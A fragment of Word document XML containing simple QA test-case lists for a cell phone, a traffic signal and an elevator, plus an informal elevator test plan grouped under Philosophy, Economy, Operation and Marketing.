              <w:spacing w:before="150" w:after="240" w:line="300"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1) Check the correct insertion of the Battery in the cell phone.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2) Check the proper operation of Switch ON and Switch OFF functions of the cell phone.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3) Check the correct insertion of the SIM Card in the cell phone.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4) Check the correct insertion of one contact name and phone number in the Address book.</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5) Check the successful operation of the Incoming call.</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6) Check the successful operation of the outgoing call.</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7) Check the successful operation of sending and receiving of Short Messages.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8) Check the correct selection &amp; display of all Numbers and special characters.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9) Check the successful deletion of contact name and phone number from the Address book.</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10) Check the successful capturing of the home Network from the service provider.</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11) Check the successful connectivity of the GPRS facility – if supported on the cell phone.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12) Check the successful connectivity of the EDGE facility – if supported on the cell phone.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r>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000080"/>
              </w:rPr>
              <w:t>Test Case – 3: Test Case for a Traffic Signal </w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00BC3F7A">
            <w:pPr>
              <w:spacing w:before="150" w:after="0" w:line="300"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t>1) Check the presence of three lights like Green, Yellow &amp; Red on the traffic light post. </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2) Check the switching sequence of the lights.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3) Check the defined time delay between the switching of lights of defined colors. </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4) Check the possibility and accuracy of adjustment in defining the time delay between the switching of various lights depending upon the traffic density.</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5) Check the switching ON of light of one color at one particular time. </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6) Check the switching of lights from some type of sensor.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00BC3F7A">
            <w:pPr>
              <w:spacing w:before="150" w:after="0" w:line="300" w:lineRule="atLeast"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="333333"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="333333"/>
              </w:rPr>
              <w:br/>
            </w:r>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000080"/>
              </w:rPr>
              <w:t>Test Case – 4: Test Case for an Elevator </w:t>
            </w:r>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="333333"/>
              </w:rPr>
              <w:br/>
            </w:r>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="333333"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:br/>
            </w:r>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="333333"/>
              </w:rPr>
              <w:t>1) Check the capability of Upward &amp; Downward movement.</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2) Check the proper stopping at each and every floor.</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3) Check the stoppage exactly at the floor whose corresponding number is pressed.</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4) Check the automatic upward movement when called by someone from some floor at higher level.</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5) Check the automatic downward movement when called by someone from some floor at lower level.</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5) Check the proper functioning of the wait function till Close button is pressed. </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6) Check the automatic opening of the door in the event of someone trying to step in while the closing of the door is in progress.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7) Check the motion of the elevator without any jerks.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8) Check the load limit prescribed for the elevator – Warn if load limit exceeds.</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9) Check the presence &amp; proper functioning of auto descent facility in case of power failure.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10) Check the presence &amp; proper functioning of the communication system in case of power failure.</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11) Check the presence &amp; proper functioning of the ventilation system provided.</w:t>
            </w:r>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="333333"/>
              </w:rPr>
              <w:br/>
            </w:r>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="333333"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">12) Check the presence &amp; proper functioning of the </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="333333"/>
              </w:rPr>
              <w:t>fire fighting</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="333333"/>
              </w:rPr>
              <w:t xml:space="preserve"> system in case of emergency</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="18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 xml:space="preserve">So I am using the same 4 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t>decipline</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t xml:space="preserve"> that helps in defining the quality of a product for writing my test cases for elevator.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="18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 xml:space="preserve">I am going to divide my test cases in these 4 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t>decipline</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="18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1-      Philosophy</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:br/>
        <w:t>2-      Economy</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:br/>
        <w:t>3-       Marketing</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:br/>
        <w:t>4-      Operation Management</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="18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Test case for elevator</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="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b/>
          <w:bCs/>
          <w:color w:val="111111"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Philosophy</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="18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1-      Verify the height and width and volume of life as per the requirement.</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:br/>
        <w:t>2-      Verify that button for closing lift, opening lift, fan, emergency and all floor numbers should be there on button panel</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:br/>
        <w:t>3-      Verify the presence of display where floor number appears</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:br/>
        <w:t>4-      Verify floor number is being announced on each floor</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:br/>
        <w:t>5-      Verify the light and aroma along with some instrumental music</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">6-      Verify that maximum number of </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t>people  and</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t xml:space="preserve"> weight is written on wall and also verify all emergency instructions.</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:br/>
        <w:t>7-      Verify</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t>  up</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t xml:space="preserve"> and down button  outside the life</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:br/>
        <w:t>8-      Verify the presence of sensor</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="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b/>
          <w:bCs/>
          <w:color w:val="111111"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Economy</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="111111"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t>1-      Verify power used in operation since this is not the main concern here so I am just leaving this part.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="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b/>
          <w:bCs/>
          <w:color w:val="111111"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Operation</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="111111"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t>1-      Verify that lift is able to move up and down</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:br/>
        <w:t>2-      Verify that lift is capable to stop on floors which are pressed in button panel</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:br/>
        <w:t>3-      Verify that lift close when close button is placed or should close once after few time as per manual time</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:br/>
        <w:t>4-      Verify that fan is working on pressing respective button</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:br/>
        <w:t>5-      Verify the sensor</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:br/>
        <w:t>When lift is going to close and someone has just put any object or body parts in between the lift doors</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:br/>
        <w:t>6-      Verify the maximum weighing capacity of life by putting weight</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:br/>
        <w:t>7-      Verify that when weight exceed from standard than it should give some alert message or some alert sound should ring</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:br/>
        <w:t>8-      Verify that light and fan is running at power failure</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:br/>
        <w:t>9-      Verify the jerk on power failure</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:br/>
        <w:t>10-   Verify the speed of lift  , it shouldn’t be fast</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">11-   Verify that lift stops at right floor </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t>i.e</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t xml:space="preserve"> if user click on 2</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:vertAlign w:val="superscript"/>
        </w:rPr>
        <w:t>nd</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t> floor then lift should stop on 2</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:vertAlign w:val="superscript"/>
        </w:rPr>
        <w:t>nd</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t> floor not on 4</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:vertAlign w:val="superscript"/>
        </w:rPr>
        <w:t>th</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t> floor.</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:br/>
        <w:t>12-   Verify the landing speed of lift</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:br/>
        <w:t>13-   Verify the time between two successive floors.</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:br/>
        <w:t>14-   Verify that lift doors can’t be open when lift is moving down or upward</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>15-   Verify that lift doors are closed when no one is using it</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:br/>
        <w:t>16-   Verify that once lift has crossed certain floor and some person has click to open lift then lift should open when lift comes down at that floor.</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:br/>
        <w:t>17-    Some test cases that is basically based on Reliability</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="384" w:lineRule="atLeast"/>
        <w:ind w:left="480"/>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Verify working of lift on power failure</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="384" w:lineRule="atLeast"/>
        <w:ind w:left="480"/>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Verify working of lift once power comes</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="384" w:lineRule="atLeast"/>
        <w:ind w:left="480"/>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color w:val="111111"/>
        </w:rPr>
        <w:t>Verify the working of lift once weight exceeds the standard weight.</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="111111"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="384" w:lineRule="atLeast"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="111111"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Marketing</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="111111"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>1-      Since this is mainly done if we are testing lift for sell purpose.</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="111111"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Friends I have tried and now it’s your turn to add value to these test cases.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
